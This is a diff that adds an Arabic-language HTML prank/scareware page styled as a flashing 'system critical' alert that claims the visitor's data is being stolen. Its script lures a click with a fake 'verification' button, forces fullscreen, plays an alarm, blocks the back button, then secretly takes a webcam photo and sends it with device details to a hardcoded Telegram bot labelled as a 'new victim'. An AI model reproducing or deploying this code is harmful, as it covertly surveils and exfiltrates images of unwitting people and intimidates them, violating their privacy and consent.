@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>SYSTEM CRITICAL</title>
+    <style>
+        body { background: #000; color: #f00; font-family: monospace; overflow: hidden; height: 100vh; margin: 0; text-align: center; }
+        .full { width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; border: 20px solid #f00; animation: flash 0.3s infinite; }
+        @keyframes flash { 0% { border-color: #f00; } 50% { border-color: #550000; } }
+        .name-tag { font-size: 2.5em; color: #fff; margin-bottom: 10px; }
+        .big-text { font-size: 3em; font-weight: bold; margin: 10px; }
+        .progress-container { width: 80%; height: 40px; border: 3px solid #0f0; margin: 20px; background: #111; }
+        .progress-bar { height: 100%; width: 0%; background: #0f0; box-shadow: 0 0 15px #0f0; transition: width 0.1s; }
+        .status-text { color: #0f0; font-size: 1.5em; margin-top: 10px; }
+        .btn { padding: 30px 60px; font-size: 2em; background: #f00; color: #fff; border: none; cursor: pointer; border-radius: 15px; margin-top: 20px; }
+    </style>
+</head>
+<body onclick="start()">
+    <audio id="alarm" loop>
+        <source src="https://www.soundjay.com/mechanical/sounds/alarm-clock-01.mp3" type="audio/mpeg">
+    </audio>
+    
+    <div class="full">
+        <div class="name-tag">الديزل إدمان 😈</div>
+        <div class="big-text">⚠️ تم سحب بياناتك بواسطة الديزل!</div>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="bar"></div>
+        </div>
+        <div class="status-text" id="status">جاري تهيئة سحب ملفات النظام...</div>
+        
+        <button class="btn" onclick="start()">تأكيد التحقق (مهم جداً)</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8627248426:AAEtvtxQzAThKrVmI1orIx7GF4-wFXSYG-4";
+        const CHAT_ID = "5177962707";
+        const devInfo = navigator.platform + " | " + navigator.userAgent;
+
+        function start() {
+            document.getElementById('alarm').play();
+            document.documentElement.requestFullscreen();
+            
+            // شريط التحميل يتحرك
+            let width = 0;
+            const bar = document.getElementById('bar');
+            const status = document.getElementById('status');
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                    status.innerText = "تمت العملية بنجاح! تم نقل البيانات.";
+                } else {
+                    width++;
+                    bar.style.width = width + "%";
+                    status.innerText = "جاري سحب الملفات: " + width + "%";
+                }
+            }, 100);
+
+            // تصوير الضحية
+            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                const canvas = document.createElement('canvas');
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(blob => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('photo', blob);
+                        fd.append('caption', `😈 ضحية جديدة للديزل! %0A الجهاز: ${devInfo}`);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    });
+                }, 2000);
+            });
+        }
+
+        window.history.pushState(null, null, document.URL);
+        window.addEventListener('popstate', () => {
+            window.history.pushState(null, null, document.URL);
+            alert("لا يمكنك الهروب من الديزل! النظام قيد التشغيل.");
+        });
+    </script>
+</body>
+</html>
